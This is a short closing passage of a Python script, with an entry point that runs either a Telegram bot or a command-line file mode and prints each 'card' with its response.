            print(f"{card} -> {resp}")


if __name__ == "__main__":
    # If the first CLI argument is 'telegram', start the Telegram bot; otherwise run CLI file mode.
    mode = sys.argv[1] if len(sys.argv) > 1 else "cli"
    if mode == "telegram":
        asyncio.run(run_telegram_bot())
    else:
        asyncio.run(main())
